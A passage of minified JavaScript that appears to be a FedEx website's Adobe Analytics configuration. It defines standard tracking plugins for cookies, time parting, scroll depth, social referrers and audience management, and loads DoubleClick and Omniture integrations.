new Function("v", "cn", "ex", "ct", "dl", "ev", "dv", "var s=this,ce;if(typeof(dv)==='undefined')dv=0;if(s.events&&ev){var ay=s.split(ev,',');var ea=s.split(s.events,',');for(var u=0;u<ay.length;u++){for(var x=0;x<ea.length;x++){if(ay[u]==ea[x]){ce=1;}}}}if(!v||v==''){if(ce){s.c_w(cn,'');return'';}else return'';}v=escape(v);var arry=new Array(),a=new Array(),c=s.c_r(cn),g=0,h=new Array();if(c&&c!=''){arry=s.split(c,'],[');for(q=0;q<arry.length;q++){z=arry[q];z=s.repl(z,'[','');z=s.repl(z,']','');z=s.repl(z,\"'\",'');arry[q]=s.split(z,',')}}var e=new Date();e.setFullYear(e.getFullYear()+5);if(dv==0&&arry.length>0&&arry[arry.length-1][0]==v)arry[arry.length-1]=[v,new Date().getTime()];else arry[arry.length]=[v,new Date().getTime()];var start=arry.length-ct<0?0:arry.length-ct;var td=new Date();for(var x=start;x<arry.length;x++){var diff=Math.round((td.getTime()-arry[x][1])/86400000);if(diff<ex){h[g]=unescape(arry[x][0]);a[g]=[arry[x][0],arry[x][1]];g++;}}var data=s.join(a,{delim:',',front:'[',back:']',wrap:\"'\"});s.c_w(cn,data,e);var r=s.join(h,{delim:dl});if(ce)s.c_w(cn,'');return r;"), s.p_gpvne = new Function("k", "u", "var s=this,v='',i=u.indexOf('?'),q;if(k&&i>-1){q=u.substring(i+1);v=s.pt(q,'&','p_gvfne',k)}return v"), s.p_gvfne = new Function("t", "k", "if(t){var s=this,i=t.indexOf('='),p=i<0?t:t.substring(0,i),v=i<0?'True':t.substring(i+1);if(p.toLowerCase()==k.toLowerCase())return v;}return ''"), s.pt = new Function("x", "d", "f", "a", "var s=this,t=x,z=0,y,r;while(t){y=t.indexOf(d);y=y<0?t.length:y;t=t.substring(0,y);r=s[f](t,a);if(r)return r;z+=y+d.length;t=x.substring(z,x.length);t=z<x.length?t:''}return'';"), s.getQueryParamNoEncode = new Function("p", "d", "u", "var s=this,v='',i,t;d=d?d:'';u=u?u:(s.pageURL?s.pageURL:window.location);if(u=='f')u=s.gtfs().location;while(p){i=p.indexOf(',');i=i<0?p.length:i;t=s.p_gpvne(p.substring(0,i),u+'');if(t)v+=v?d+t:t;p=p.substring(i==p.length?i:i+1)}return v"), s.getNewRepeat = new Function("d", "cn", "var s=this,e=new Date(),cval,sval,ct=e.getTime();d=d?d:30;cn=cn?cn:'s_nr';e.setTime(ct+d*24*60*60*1000);cval=s.c_r(cn);if(cval.length==0){s.c_w(cn,ct+'-New',e);return'New';}sval=s.split(cval,'-');if(ct-sval[0]<30*60*1000&&sval[1]=='New'){s.c_w(cn,ct+'-New',e);return'New';}else{s.c_w(cn,ct+'-Repeat',e);return'Repeat';}"), s.getValOnce = new Function("v", "c", "e", "var s=this,k=s.c_r(c),a=new Date;e=e?e:0;if(v){a.setTime(a.getTime()+e*86400000);s.c_w(c,v,e?a:0);}return v==k?'':v"), s.getPreviousValue = new Function("v", "c", "el", "var s=this,t=new Date,i,j,r='';t.setTime(t.getTime()+1800000);if(el){if(s.events){i=s.split(el,',');j=s.split(s.events,',');for(x in i){for(y in j){if(i[x]==j[y]){if(s.c_r(c)) r=s.c_r(c);v?s.c_w(c,v,t):s.c_w(c,'no value',t);return r}}}}}else{if(s.c_r(c)) r=s.c_r(c);v?s.c_w(c,v,t):s.c_w(c,'no value',t);return r}"), s.getTimeParting = new Function("t", "z", "y", "dc=new Date('1/1/2000');f=15;ne=8;if(dc.getDay()!=6||dc.getMonth()!=0){return'Data Not Available'}else{;z=parseInt(z);if(y=='2009'){f=8;ne=1};gmar=new Date('3/1/'+y);dsts=f-gmar.getDay();gnov=new Date('11/1/'+y);dste=ne-gnov.getDay();spr=new Date('3/'+dsts+'/'+y);fl=new Date('11/'+dste+'/'+y);cd=new Date();if(cd>spr&&cd<fl){z=z+1}else{z=z};utc=cd.getTime()+(cd.getTimezoneOffset()*60000);tz=new Date(utc + (3600000*z));thisy=tz.getFullYear();var days=['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];if(thisy!=y){return'Data Not Available'}else{;thish=tz.getHours();thismin=tz.getMinutes();thisd=tz.getDay();var dow=days[thisd];var ap='AM';var dt='Weekday';var mint='00';if(thismin>30){mint='30'}if(thish>=12){ap='PM';thish=thish-12};if (thish==0){thish=12};if(thisd==6||thisd==0){dt='Weekend'};var timestring=thish+':'+mint+ap;var daystring=dow;var endstring=dt;if(t=='h'){return timestring}if(t=='d'){return daystring};if(t=='w'){return endstring}}};"), s.setupLinkTrack = new Function("vl", "c", "e", "var s=this;var cv=s.c_r(c);if(vl){var vla=vl.split(',');}if(cv!=''){var cva=s.split(cv,'^^');if(cva[1]!=''){for(x in vla){s[vla[x]]=cva[x];if(e){s.events=s.apl(s.events,e,',',2);}}}}s.c_w(c,'',0);if(typeof s.linkObject!='undefined'&&s.hbx_lt!='manual'){s.lta=[];if(typeof s.linkObject!=null){slo=s.linkObject;if(s.linkObject!=0){if(s.linkObject.getAttribute('name')!=null){var b=s.linkObject.getAttribute('name');if(b.indexOf('&lpos=')>-1){s.lta[3]=b.match('&lpos=([^&]*)')[1];}if(b.indexOf('&lid=')>-1){s.lta[1]=b.match('&lid=([^&]*)')[1];}}}if(typeof s.lta[1]=='undefined'){if(s.linkName!=0){s.lta[1]=s.linkName;}else if(s.linkObject!=0){if(s.linkObject.innerHTML.indexOf('<img')>-1){s.lta[1]=s.linkObject.innerHTML.match('src=\"([^\"]*)')[1];}else{s.lta[1]=s.linkObject.innerHTML;}}else if(s.linkURL){s.lta[1]=s.linkURL;}else{s.lta[1]=null;}}if(s.lta[1]!=null){if(typeof s.pageName!='undefined')s.lta[0]=s.pageName;s.lta[2]=s.pageName+' | '+s.lta[1];}}if(s.linkType!=0){for(var x=0;x<vla.length;x++){s[vla[x]]=s.cleanStr(s.lta[x]);if(e){s.events=s.apl(s.events,e,',',2);s.linkTrackVars=s.apl(s.linkTrackVars,'events',',',2);}}s.linkTrackVars=s.apl(s.linkTrackVars,vl,',',2);}else{if(s.lta[1]){var tcv='';for(var x=0;x<s.lta.length;x++){tcv+=s.cleanStr(s.lta[x])+'^^';}s.c_w(c,tcv);}}s.lta=null;}"), s.cleanStr = function (e) {
    if (void 0 !== e) return e = (e = e.replace(/<\/?[^>]+(>|$)/g, "")).replace(/^\s+|\s+$/g, "");
  }, s.split = new Function("l", "d", "var i,x=0,a=new Array;while(l){i=l.indexOf(d);i=i>-1?i:l.length;a[x++]=l.substring(0,i);l=l.substring(i+d.length);}return a"), s.apl = new Function("L", "v", "d", "u", "var s=this,m=0;if(!L)L='';if(u){var i,n,a=s.split(L,d);for(i=0;i<a.length;i++){n=a[i];m=m||(u==1?(n==v):(n.toLowerCase()==v.toLowerCase()));}}if(!m)L=L?L+d+v:v;return L"), s.rfl = function (e, t, n, i, r) {
    if (!e || !t) return "";
    var a = [],
      s = "";
    i = i || n, r = !!r, n = (e = e.split(n || ",")).length;
    for (var o = 0; o < n; o++) -1 < e[o].indexOf(":") && ((s = e[o].split(":"))[1] = s[0] + ":" + s[1], e[o] = s[0]), -1 < e[o].indexOf("=") && ((s = e[o].split("="))[1] = s[0] + "=" + s[1], e[o] = s[0]), e[o] !== t && s ? a.push(s[1]) : e[o] !== t ? a.push(e[o]) : e[o] === t && r && (s ? a.push(s[1]) : a.push(e[o]), r = !1), s = "";
    return a.join(i);
  }, s.getAndPersistValue = new Function("v", "c", "e", "var s=this,a=new Date;e=e?e:0;a.setTime(a.getTime()+e*86400000);if(v)s.c_w(c,v,e?a:0);return s.c_r(c);"), s.join = new Function("v", "p", "var s = this;var f,b,d,w;if(p){f=p.front?p.front:'';b=p.back?p.back:'';d=p.delim?p.delim:'';w=p.wrap?p.wrap:'';}var str='';for(var x=0;x<v.length;x++){if(typeof(v[x])=='object' )str+=s.join( v[x],p);else str+=w+v[x]+w;if(x<v.length-1)str+=d;}return f+str+b;"), s.socialPlatforms = new Function("a", "var s=this,g,K,D,E,F,i;g=s.referrer?s.referrer:document.referrer;g=g.toLowerCase();K=s.split(s.socPlatList,'|');for(i=0;i<K.length;i++){D=s.split(K[i],'>');if(g.indexOf(D[0])!=-1){s.contextData['a.socialcontentprovider']=D[1];}}"), s.socPlatList = "facebook.com>Facebook|twitter.com>Twitter|t.co/>Twitter|youtube.com>Youtube|clipmarks.com>Clipmarks|dailymotion.com>Dailymotion|delicious.com>Delicious|digg.com>Digg|diigo.com>Diigo|flickr.com>Flickr|flixster.com>Flixster|fotolog.com>Fotolog|friendfeed.com>FriendFeed|google.com/buzz>Google Buzz|buzz.googleapis.com>Google Buzz|plus.google.com>Google+|hulu.com>Hulu|identi.ca>identi.ca|ilike.com>iLike|intensedebate.com>IntenseDebate|myspace.com>MySpace|newsgator.com>Newsgator|photobucket.com>Photobucket|plurk.com>Plurk|slideshare.net>SlideShare|smugmug.com>SmugMug|stumbleupon.com>StumbleUpon|tumblr.com>Tumblr|vimeo.com>Vimeo|wordpress.com>WordPress|xanga.com>Xanga|metacafe.com>Metacafe|pinterest.com>Pinterest", s.socialAuthors = new Function("", "var s=this,g;g=s.referrer?s.referrer:document.referrer;if(g.indexOf('http://t.co/')===0||g.indexOf('https://t.co/')===0||g.indexOf('pinterest.com/pin')!==-1||g.indexOf('tumblr.com')!==-1||g.indexOf('youtube.com')!==-1){s.Integrate.add('SocialAuthor');s.Integrate.SocialAuthor.get('http://sa-services.social.omniture.com/author/name?var=[VAR]&callback=s.socialAuthorSearch&rs='+encodeURIComponent(s.account)+'&q='+encodeURIComponent(g));s.Integrate.SocialAuthor.delay();s.Integrate.SocialAuthor.setVars=function(s,p){s.contextData['a.socialauthor']=s.user;}}"), s.socialAuthorSearch = new Function("obj", "var s=this;if(typeof obj==='undefined'||typeof obj.author==='undefined'){s.user='Not Found';}else{s.user=obj.author;}s.Integrate.SocialAuthor.ready();"), !s.__ccucr) {
    function e(e) {
      var t,
        n,
        i,
        r = this,
        a = (new Date(), r.c_rr(e)),
        s = r.c_rspers();
      return a || (e = r.Util.urlDecode(e), t = s.indexOf(" " + e + "="), n = (t = (s = t < 0 ? r.c_rr("s_sess") : s).indexOf(" " + e + "=")) < 0 ? t : s.indexOf("|", t), i = t < 0 ? t : s.indexOf(";", t), n = n > 0 ? n : i, a = t < 0 ? "" : r.Util.urlDecode(s.substring(t + 2 + e.length, n < 0 ? s.length : n)));
    }
    function t() {
      var e = s.c_rr("s_pers"),
        t = new Date().getTime(),
        n = null,
        i = [],
        r = "";
      if (!e) return r;
      for (var a = 0, o = (i = e.split(";")).length; a < o; a++) (n = i[a].match(/\|([0-9]+)$/)) && parseInt(n[1]) >= t && (r += i[a] + ";");
      return r;
    }
    s.c_rr = s.c_r, s.__ccucr = !0, s.c_rspers = t, s.c_r = e;
  }
  if (!s.__ccucw) {
    function n(e, t, n) {
      var i,
        r,
        a,
        s,
        o = this,
        c = new Date(),
        l = 0,
        u = "s_pers",
        d = "s_sess",
        p = 0,
        f = 0;
      if (c.setTime(c.getTime() - 6e4), o.c_rr(e) && o.c_wr(e, "", c), e = o.Util.urlEncode(e), (a = (i = o.c_rspers()).indexOf(" " + e + "=")) > -1 && (i = i.substring(0, a) + i.substring(i.indexOf(";", a) + 1), p = 1), (a = (r = o.c_rr(d)).indexOf(" " + e + "=")) > -1 && (r = r.substring(0, a) + r.substring(r.indexOf(";", a) + 1), f = 1), c = new Date(), n ? n.getTime() > c.getTime() && (i += " " + e + "=" + o.Util.urlEncode(t) + "|" + n.getTime() + ";", p = 1) : (r += " " + e + "=" + o.Util.urlEncode(t) + ";", f = 1), r = r.replace(/%00/g, ""), i = i.replace(/%00/g, ""), f && o.c_wr(d, r, 0), p) {
        for (s = i; s && -1 != s.indexOf(";");) {
          var g = parseInt(s.substring(s.indexOf("|") + 1, s.indexOf(";")));
          s = s.substring(s.indexOf(";") + 1), l = l < g ? g : l;
        }
        c.setTime(l), o.c_wr(u, i, c);
      }
      return t == o.c_r(o.Util.urlEncode(e));
    }
    s.c_wr = s.c_w, s.__ccucw = !0, s.c_w = n;
  }
  s.p_fo = new Function("n", "var s=this;if(!s.__fo){s.__fo=new Object;}if(!s.__fo[n]){s.__fo[n]=new Object;return 1;}else {return 0;}"), s.repl = new Function("x", "o", "n", "var i=x.indexOf(o),l=n.length;while(x&&i>=0){x=x.substring(0,i)+n+x.substring(i+o.length);i=x.indexOf(o,i+l)}return x"), s.clickPast = new Function("scp", "ct_ev", "cp_ev", "cpc", "var s=this,scp,ct_ev,cp_ev,cpc,ev,tct;if(s.p_fo(ct_ev)==1){if(!cpc){cpc='s_cpc';}ev=s.events?s.events+',':'';if(scp){s.events=ev+ct_ev;s.c_w(cpc,1,0);}else{if(s.c_r(cpc)>=1){s.events=ev+cp_ev;s.c_w(cpc,0,0);}}}"), s.manageQueryParam = new Function("p", "w", "e", "u", "var s=this,x,y,i,qs,qp,qv,f,b;u=u?u:(s.pageURL?s.pageURL:''+window.location);x=u.indexOf('?');qs=x>-1?u.substring(x,u.length):'';u=x>-1?u.substring(0,x):u;x=qs.indexOf('?'+p+'=');if(x>-1){y=qs.indexOf('&');f='';if(y>-1){qp=qs.substring(x+1,y);b=qs.substring(y+1,qs.length);}else{qp=qs.substring(1,qs.length);b='';}}else{x=qs.indexOf('&'+p+'=');if(x>-1){f=qs.substring(1,x);b=qs.substring(x+1,qs.length);y=b.indexOf('&');if(y>-1){qp=b.substring(0,y);b=b.substring(y,b.length);}else{qp=b;b='';}}}if(e&&qp){y=qp.indexOf('=');qv=y>-1?qp.substring(y+1,qp.length):'';var eui=0;while(qv.indexOf('%25')>-1){qv=unescape(qv);eui++;if(eui==10)break;}qv=s.replace(qv,'+',' ');qv=escape(qv);qv=s.replace(qv,'%25','%');qv=s.replace(qv,'%7C','|');qv=s.replace(qv,'%7c','|');qp=qp.substring(0,y+1)+qv;}if(w&&qp){if(f)qs='?'+qp+'&'+f+b;else if(b)qs='?'+qp+'&'+b;else qs='?'+qp}else if(f)qs='?'+f+'&'+qp+b;else if(b)qs='?'+qp+'&'+b;else if(qp)qs='?'+qp;return u+qs;"), s.handlePPVevents = new Function("", "var W=window,s=W.s_name&&typeof W[s_name]=='object'?W[s_name]:0;if(!s||!s.getPPVid)return;var B=document.body,E=document.documentElement,D=window.document;d=Math.max(B.scrollHeight,E.scrollHeight,B.offsetHeight,E.offsetHeight,B.clientHeight,E.clientHeight),v=window.innerHeight||E.clientHeight||B.clientHeight,t=window.pageYOffset||D.documentElement.scrollTop||D.body.scrollTop,h=t+v,p=Math.min(Math.round(h/d*100),100),c=s.c_r('s_ppv'),a=c.indexOf(',')>-1?c.split(',',4):[],l=a.length,n=l>0?a[0]:escape(s.getPPVid),P=l>1?parseInt(a[1]):0,f=l>2?parseInt(a[2]):p,H=l>3?parseInt(a[3]):0,cn=p>0?n+','+(p>P?p:P)+','+f+','+(h>H?h:H):'';s.c_w('s_ppv',cn)"), s.getPercentPageViewed = new Function("n", "if(typeof this.linkType!='undefined')return'';var s=this,w=window,F=false,e=window.addEventListener||window.attachEvent||'';i=3,v=s.c_r('s_ppv'),a=v.indexOf(',')>-1?v.split(',',4):[];if(a.length<4){while(i>0)a[i--]=i<a.length?a[i-1]:'';a[0]=''}a[0]=unescape(a[0]);s.getPPVid=n=n||s.pageName||document.location.href;s.c_w('s_ppv',escape(n));if(!s.getPPVevents){s.getPPVevents=1;if(!w.s_name){for(i in w)if(w[i]===s){s_name=i;break}}for(i in{'load':'','scroll':'','resize':''})e((window.attachEvent?'on':'')+i,s.handlePPVevents,F)}return a"), s.trackTNT = new Function("v", "p", "b", "var s=this,n='s_tnt',q='s_tntref',p=(p)?p:n,v=(v)?v:n,r='',pm=false,b=(b)?b:true;if(s.Util.getQueryParam(q)!=''){s.referrer=s.Util.getQueryParam(q);}else if(s.c_r(q)!=''){s.referrer=s.c_r(q);document.cookie=q+'=;path=/;expires=Thu, 01-Jan-1970 00:00:01 GMT;';}else if((document.cookie.indexOf(q)!=-1&&s.c_r(q)=='')||(location.search.indexOf(q+'=')!=-1&&s.Util.getQueryParam(q)=='')){s.referrer='Typed/Bookmarked';document.cookie=q+'=;path=/;expires=Thu, 01-Jan-1970 00:00:01 GMT;';}if(s.Util.getQueryParam(p)!=''){pm=s.Util.getQueryParam(p);}else if(s.c_r(p)){pm=s.c_r(p);document.cookie=p+'=;path=/;expires=Thu, 01-Jan-1970 00:00:01 GMT;';}else if(s.c_r(p)==''&&s.Util.getQueryParam(p)==''){pm='';}if(pm)r+=(pm+',');if(window[v]!=undefined)r+=window[v];if(b)window[v]='';return r;"), s.getAamSegments = new Function("a", "b", "var s=this;var c=s.c_r(a);if(c){c=s.repl(c,b+'=','');}return c"), s.apl = new Function("L", "v", "d", "u", "var s=this,m=0;if(!L)L='';if(u){var i,n,a=s.split(L,d);for(i=0;i<a.length;i++){n=a[i];m=m||(u==1?(n==v):(n.toLowerCase()==v.toLowerCase()));}}if(!m)L=L?L+d+v:v;return L"), window.s && "object" == typeof window.s && (s.Util, 1) && "object" == typeof s.Util && (window.s.Util.getQueryParam = function (e, t, n) {
    var i,
      r = window;
    return t || (t = s.pageURL ? s.pageURL : r.location), n || (n = "&"), e && t && (i = (t = "" + t).indexOf("?")) >= 0 && (i = (t = n + t.substring(i + 1) + n).toString().toLowerCase().indexOf(n + e.toString().toLowerCase() + "=")) >= 0 && ((i = (t = t.substring(i + n.length + e.length + 1)).toString().toLowerCase().indexOf(n.toString().toLowerCase())) >= 0 && (t = t.substring(0, i)), t.length > 0) ? s.unescape(t) : "";
  }), s.oncePerPage = function (e) {
    if (e) {
      for (var t = s.opp.split(","), n = 0; n < t.length; n++) s.events && (v = new RegExp(",*?" + t[n] + "\\b"), null != s.events.match(v) && (s.events = s.events.replace(v, ""), "," == s.events.substring(0, 1) && (s.events = s.events.substring(1, s.events.length))));
      for (var i = e.split(","), r = 0; r < i.length; r++) s.opp = s.apl(s.opp, i[r], ",", 2);
    }
  }, s.loadModule("Media"), s.Media.autoTrack = !0, s.Media.trackWhilePlaying = !0, s.Media.trackVars = "None", s.Media.trackEvents = "None", "us" == _satellite.getVar("content:region").toLowerCase() && window.location.href.indexOf("/fedextrack") > -1 && (s.contextData["cm.ssf"] = 1);
  var r = "" !== _satellite.getVar("aam:regionFlag") && 0 != _satellite.getVar("aam:regionFlag"),
    a = "" !== _satellite.getVar("aam:countryFlag") && 0 != _satellite.getVar("aam:countryFlag"),
    o = "false" !== _satellite.getVar("aam:IdSyncDisable"),
    c = _satellite.getVar("aam:RegionContainerNSID");
  (r || a) && (s.loadModule("AudienceManagement"), s.AudienceManagement.setup({
    partner: "fedex",
    containerNSID: c,
    visitorService: {
      namespace: "1E22171B520E93BF0A490D44@AdobeOrg"
    },
    disableDefaultRequest: !0,
    disableScriptAttachment: !0,
    disableDestinationPublishingIframe: o
  }));
  var l = {
    CSID: "",
    SPOTID: "4191263",
    tEvar: "eVar62",
    errorEvar: "eVar63",
    requestURL: "http://fls.doubleclick.net/json?spot=[SPOTID]&src=[CSID]&var=[VAR]&host=integrate.112.2o7.net%2Fdfa_echo%3Fvar%3D[VAR]%26AQE%3D1%26A2S%3D1&ord=[RAND]",
    maxDelay: "750",
    visitCookie: "s_dfa",
    clickThroughParam: "CID",
    searchCenterParam: void 0,
    newRsidsProp: void 0
  };
  s.maxDelay = l.maxDelay, s.loadModule("Integrate"), s.Integrate.onLoad = function (e) {
    e.socialAuthors(), e.partnerDFACheck(l) && (e.Integrate.add("DFA"), e.Integrate.DFA.tEvar = l.tEvar, e.Integrate.DFA.errorEvar = l.errorEvar, e.Integrate.DFA.timeoutEvent = l.timeoutEvent, e.Integrate.DFA.CSID = l.CSID, e.Integrate.DFA.SPOTID = l.SPOTID, e.Integrate.DFA.get(l.requestURL), e.Integrate.DFA.setVars = function (e, t) {
      window[t.VAR] ? t.ec ? t.errorEvar && (e[t.errorEvar] = t.ec) : e[t.tEvar] = "DFA-" + (t.lis ? t.lis : 0) + "-" + (t.lip ? t.lip : 0) + "-" + (t.lastimp ? t.lastimp : 0) + "-" + (t.lastimptime ? t.lastimptime : 0) + "-" + (t.lcs ? t.lcs : 0) + "-" + (t.lcp ? t.lcp : 0) + "-" + (t.lastclk ? t.lastclk : 0) + "-" + (t.lastclktime ? t.lastclktime : 0) : t.timeoutEvent && (e.events = (e.events && "" != e.events ? e.events + "," : "") + t.timeoutEvent);
    });
  };
}
function getTimeBetweenEvents(e, t, n, i, r, s, o, c, l) {
  var u = e,
    d = t,
    p = n,
    f = i,
    v = r,
    h = s,
    m = o,
    b = c,
    _ = l;
  if ("-v" === u) return {
    plugin: "getTimeBetweenEvents",
    version: "3.0"
  };
  var k = function () {
    if (void 0 !== window.s_c_il) for (var e, t = 0; t < window.s_c_il.length; t++) if ((e = window.s_c_il[t])._c && "s_c" === e._c) return e;
  }();
  if (void 0 !== k && (k.contextData.getTimeBetweenEvents = "3.0", window.cookieWrite = window.cookieWrite || function (e, t, n) {
    if ("string" == typeof e) {
      var i = window.location.hostname,
        r = window.location.hostname.split(".").length - 1;
      if (i && !/^[0-9.]+$/.test(i)) {
        r = 2 < r ? r : 2;
        var a = i.lastIndexOf(".");
        if (0 <= a) {
          for (; 0 <= a && 1 < r;) a = i.lastIndexOf(".", a - 1), r--;
          a = 0 < a ? i.substring(a) : i;
        }
      }
      if (g = a, t = void 0 !== t ? "" + t : "", n || "" === t) if ("" === t && (n = -60), "number" == typeof n) {
        var s = new Date();
        s.setTime(s.getTime() + 6e4 * n);
      } else s = n;
      return !(!e || (document.cookie = encodeURIComponent(e) + "=" + encodeURIComponent(t) + "; path=/;" + (n ? " expires=" + s.toUTCString() + ";" : "") + (g ? " domain=" + g + ";" : ""), void 0 === window.cookieRead)) && window.cookieRead(e) === t;
    }
  }, window.cookieRead = window.cookieRead || function (e) {
    if ("string" != typeof e) return "";
    e = encodeURIComponent(e);
    var t = " " + document.cookie,
      n = t.indexOf(" " + e + "="),
      i = 0 > n ? n : t.indexOf(";", n);
    return (e = 0 > n ? "" : decodeURIComponent(t.substring(n + 2 + e.length, 0 > i ? t.length : i))) ? e : "";
  }, window.formatTime = window.formatTime || function (e, t, n) {
    function i(e, t, n, i) {
      if ("string" != typeof t) return !1;
      if ("string" == typeof e) e = e.split(n || ",");else if ("object" != typeof e) return !1;
      for (n = 0, a = e.length; n < a; n++) if (1 == i && t === e[n] || t.toLowerCase() === e[n].toLowerCase()) return !0;
      return !1;
    }
    if (!(void 0 === e || isNaN(e) || 0 > Number(e))) {
      var r = "";
      return "string" == typeof t && "d" === t || ("string" != typeof t || !i("h,m,s", t)) && 86400 <= e ? (t = 86400, r = "days", n = isNaN(n) ? 1 : t / (n * t)) : "string" == typeof t && "h" === t || ("string" != typeof t || !i("m,s", t)) && 3600 <= e ? (t = 3600, r = "hours", n = isNaN(n) ? 4 : t / (n * t)) : "string" == typeof t && "m" === t || ("string" != typeof t || !i("s", t)) && 60 <= e ? (t = 60, r = "minutes", n = isNaN(n) ? 2 : t / (n * t)) : (t = 1, r = "seconds", n = isNaN(n) ? .2 : t / n), 0 === (r = Math.round(e * n / t) / n + " " + r).indexOf("1 ") && (r = r.substring(0, r.length - 1)), r;
    }
  }, window.inList = window.inList || function (e, t, n, i) {
    if ("string" != typeof t) return !1;
    if ("string" == typeof e) e = e.split(n || ",");else if ("object" != typeof e) return !1;
    for (n = 0, a = e.length; n < a; n++) if (1 == i && t === e[n] || t.toLowerCase() === e[n].toLowerCase()) return !0;
    return !1;
  }, "string" == typeof u && void 0 !== d && "string" == typeof p && void 0 !== f)) {
    v = v || "s_tbe", h = isNaN(h) ? 1 : Number(h);
    var y = !1,
      w = !1,
      x = u.split(","),
      D = p.split(",");
    _ = _ ? _.split(",") : [];
    for (var I, C = window.cookieRead(v), T = new Date(), O = T.getTime(), S = new Date(), L = 0; L < _.length; ++L) if (window.inList(k.events, _[L])) return S.setDate(S.getDate() - 1), void window.cookieWrite(v, "", S);
    for (S.setTime(S.getTime() + 864e5 * h), L = 0; L < x.length && !y && !0 !== (y = window.inList(k.events, x[L])); ++L);
    for (L = 0; L < D.length && !w && !0 !== (w = window.inList(k.events, D[L])); ++L);
    return 1 === x.length && 1 === D.length && u === p && y && w ? (C && (I = (O - C) / 1e3), window.cookieWrite(v, O, h ? S : 0)) : (!y || 1 != d && C || window.cookieWrite(v, O, h ? S : 0), w && C && (I = (T.getTime() - C) / 1e3, !0 === f && (S.setDate(S.getDate() - 1), window.cookieWrite(v, "", S)))), I ? window.formatTime(I, m, b) : "";
  }
}
function formatTime(e, t, n) {
  function i(e, t, n, i) {
    if ("string" != typeof t) return !1;
    if ("string" == typeof e) e = e.split(n || ",");else if ("object" != typeof e) return !1;
    for (n = 0, a = e.length; n < a; n++) if (1 == i && t === e[n] || t.toLowerCase() === e[n].toLowerCase()) return !0;
    return !1;
  }
  var r = e,
    s = t,
    o = n;
  if (arguments && "-v" === arguments[0]) return {
    plugin: "formatTime",
    version: "2.0"
  };
  var c = function () {
    if (void 0 !== window.s_c_il) for (var e, t = 0; t < window.s_c_il.length; t++) if ((e = window.s_c_il[t])._c && "s_c" === e._c) return e;
  }();
  if (void 0 !== c && (c.contextData.formatTime = "2.0"), !(void 0 === r || isNaN(r) || 0 > Number(r))) {
    if (c = "", "string" == typeof s && "d" === s || ("string" != typeof s || !i("h,m,s", s)) && 86400 <= r) {
      var l = 86400,
        u = "days";
      c = isNaN(o) ? 1 : l / (o * l);
    } else "string" == typeof s && "h" === s || ("string" != typeof s || !i("m,s", s)) && 3600 <= r ? (l = 3600, u = "hours", c = isNaN(o) ? 4 : l / (o * l)) : "string" == typeof s && "m" === s || ("string" != typeof s || !i("s", s)) && 60 <= r ? (l = 60, u = "minutes", c = isNaN(o) ? 2 : l / (o * l)) : (l = 1, u = "seconds", c = isNaN(o) ? .2 : l / o);
    return 0 === (c = Math.round(r * c / l) / c + " " + u).indexOf("1 ") && (c = c.substring(0, c.length - 1)), c;
  }
}
function inList(e, t, n, i) {
  var r = e,
    a = t,
    s = n,
    o = i;
  if ("-v" === r) return {
    plugin: "inList",
    version: "3.0"
  };
  e: {
    if (void 0 !== window.s_c_il) for (var c = 0; c < window.s_c_il.length; c++) if ((n = window.s_c_il[c])._c && "s_c" === n._c) {
      c = n;
      break e;
    }
    c = void 0;
  }
  if (void 0 !== c && (c.contextData.inList = "3.0"), "string" != typeof a) return !1;
  if ("string" == typeof r) r = r.split(s || ",");else if ("object" != typeof r) return !1;
  for (s = 0, c = r.length; s < c; s++) if (1 == o && a === r[s] || a.toLowerCase() === r[s].toLowerCase()) return !0;
  return !1;
}
function AppMeasurement_Module_Integrate(e) {
  var t = this;
  t.s = e;
  var n = window;
  n.s_c_in || (n.s_c_il = [], n.s_c_in = 0), t._il = n.s_c_il, t._in = n.s_c_in, t._il[t._in] = t, n.s_c_in++, t._c = "s_m", t.list = [], t.add = function (i, r) {
    var a;
    r || (r = "s_Integrate_" + i), n[r] || (n[r] = {}), (a = t[i] = n[r]).a = i, a.e = t, a._c = 0, a._d = 0, null == a.disable && (a.disable = 0), a.get = function (e, i) {
      var r,
        s = document,
        o = s.getElementsByTagName("HEAD");
      if (!a.disable && (i || (v = "s_" + t._in + "_Integrate_" + a.a + "_get_" + a._c), a._c++, a.VAR = v, a.CALLBACK = "s_c_il[" + t._in + "]." + a.a + ".callback", a.delay(), o = o && 0 < o.length ? o[0] : s.body)) try {
        (r = s.createElement("SCRIPT")).type = "text/javascript", r.setAttribute("async", "async"), r.src = t.c(a, e), 0 > e.indexOf("[CALLBACK]") && (r.onload = r.onreadystatechange = function () {
          a.callback(n[v]);
        }), o.firstChild ? o.insertBefore(r, o.firstChild) : o.appendChild(r);
      } catch (e) {}
    }, a.callback = function (e) {
      var t;
      if (e) for (t in e) Object.prototype[t] || (a[t] = e[t]);
      a.ready();
    }, a.beacon = function (e) {
      var i = "s_i_" + t._in + "_Integrate_" + a.a + "_" + a._c;
      a.disable || (a._c++, (i = n[i] = new Image()).src = t.c(a, e));
    }, a.script = function (e) {
      a.get(e, 1);
    }, a.delay = function () {
      a._d++;
    }, a.ready = function () {
      a._d--, a.disable || e.delayReady();
    }, t.list.push(i);
  }, t._g = function (n) {
    var i,
      r = (n ? "use" : "set") + "Vars";
    for (n = 0; n < t.list.length; n++) if ((i = t[t.list[n]]) && !i.disable && i[r]) try {
      i[r](e, i);
    } catch (e) {}
  }, t._t = function () {
    t._g(1);
  }, t._d = function () {
    var e, n;
    for (e = 0; e < t.list.length; e++) if ((n = t[t.list[e]]) && !n.disable && 0 < n._d) return 1;
    return 0;
  }, t.c = function (t, n) {
    var i, r, a, s;
    for ("http" != n.toLowerCase().substring(0, 4) && (n = "http://" + n), e.ssl && (n = e.replace(n, "http:", "https:")), t.RAND = Math.floor(1e13 * Math.random()), i = 0; 0 <= i;) 0 <= (i = n.indexOf("[", i)) && (r = n.indexOf("]", i)) > i && (2 < (a = n.substring(i + 1, r)).length && "s." == a.substring(0, 2) ? (s = e[a.substring(2)]) || (s = "") : (s = "" + t[a]) != t[a] && parseFloat(s) != t[a] && (a = 0), a && (n = n.substring(0, i) + encodeURIComponent(s) + n.substring(r + 1)), i = r);
    return n;
  };
}
function AppMeasurement_Module_AudienceManagement(e) {
  var t = this;
  t.s = e;
  var n = window;
  n.s_c_in || (n.s_c_il = [], n.s_c_in = 0), t._il = n.s_c_il, t._in = n.s_c_in, t._il[t._in] = t, n.s_c_in++, t._c = "s_m", t.setup = function (e) {
    n.DIL && e && (e.disableDefaultRequest = !0, e.disableCORS = !0, e.secureDataCollection = !1, t.instance = n.DIL.create(e), t.tools = n.DIL.tools);
  }, t.isReady = function () {
    return !!t.instance;
